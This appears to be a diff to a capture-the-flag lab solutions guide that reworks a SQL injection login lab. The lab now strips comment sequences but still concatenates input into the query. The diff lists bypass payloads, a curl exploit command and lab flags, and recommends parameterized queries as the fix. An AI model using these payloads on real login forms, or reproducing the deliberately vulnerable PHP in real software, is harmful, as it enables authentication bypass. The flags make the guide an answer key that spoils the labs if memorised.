@@ -5,7 +5,7 @@ For each lab: the vulnerable source snippet, the exact vulnerable line(s), why i
 
 | # | Lab | Vector | Endpoint | Flag |
 |---|-----|--------|----------|------|
-| 0 | Login (NIGHTFALL) | SQL Injection | `/` (POST) | `CTF{8ee4d84cbeef15123c24791da26006d9}` |
+| 0 | Login (Sentinel) | SQL Injection | `/` (POST) | `CTF{8ee4d84cbeef15123c24791da26006d9}` |
 | 1 | Basic Traversal | Path Traversal | `/dr-strange?filename=` | `CTF{75c4bcd59149b3004345e414c325f3b6}` |
 | 2 | Dot-Segment | Path Traversal | `/captain-america?filename=` | `CTF{234b5a3edf97aa319646be27d8a89db0}` |
 | 3 | Blacklist + 2× decode | Path Traversal | `/deadpool?filename=` | `CTF{2c7c8d5ec9db726a120b290922222e47}` |
@@ -23,38 +23,42 @@ For each lab: the vulnerable source snippet, the exact vulnerable line(s), why i
 - **Endpoint:** `POST /` — fields `username`, `password`
 - **Flag:** `CTF{8ee4d84cbeef15123c24791da26006d9}` (`flags/flag_login.txt`)
 
+> **Variation A (anti-copy-paste):** the login **strips SQL comment sequences** (`--`, `#`, `/* */`) before building the query, so the classic comment trick *does not* work here. The warm-up at **`/demo`** teaches the comment trick; this real login forces the learner to adapt to boolean-logic injection. (The demo flag is `flags/flag_demo.txt`; solve the demo with `admin'-- `.)
+
 **Vulnerable snippet:**
 ```php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
 
-    // user input concatenated straight into the SQL string — no parameterization
+    // "Hardening": strip comment sequences so  admin'--  is neutralised …
+    $strip = ['--', '#', '/*', '*/'];
+    $username = str_replace($strip, '', $username);
+    $password = str_replace($strip, '', $password);
+
+    // … but input is STILL concatenated → boolean injection still works
     $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";   // ◀ VULNERABLE
 
-    $result = $db->query($query);
-    $user = $result ? $result->fetch(PDO::FETCH_ASSOC) : false;
+    $user = $db->query($query)->fetch(PDO::FETCH_ASSOC);
     if ($user) { /* authenticated */ }
 }
 ```
 
-- **Exact vulnerable line** (`login-app/index.php:46`):
-  ```php
-  $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-  ```
-- **Why:** `$username` / `$password` are concatenated directly into SQL. Input like `admin'-- ` closes the string and comments out the password check.
+- **Why:** stripping comments removes only one exploitation path; the raw input is still concatenated into the query, so the attacker rewrites the boolean logic instead.
 
-**Solve payloads** (username field):
-| Payload | Effect |
-|---|---|
-| `admin'-- ` | logs in as admin (comments out password check) |
-| `' OR '1'='1` | tautology, returns first user |
+**Solve payloads:**
+| Payload | Field | Result |
+|---|---|---|
+| `admin'-- ` | username | ❌ fails — comment stripped |
+| `' OR '1'='1` | username | ❌ fails — precedence keeps the `AND password` check |
+| `admin' OR '1'='1` | username | ✅ logs in as admin (target admin so the OR wins) |
+| `' OR '1'='1` | password (with username `admin`) | ✅ alternative injection point |
 
 ```bash
-curl -s -X POST "http://<host>/" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
+curl -s -X POST "http://<host>/" --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=x"
 ```
 
-**Fix:** parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.
+**Fix:** blacklisting characters/keywords is not a fix — use a parameterized query (`WHERE username = ? AND password = ?`) and store salted password hashes.
 
 ---
 
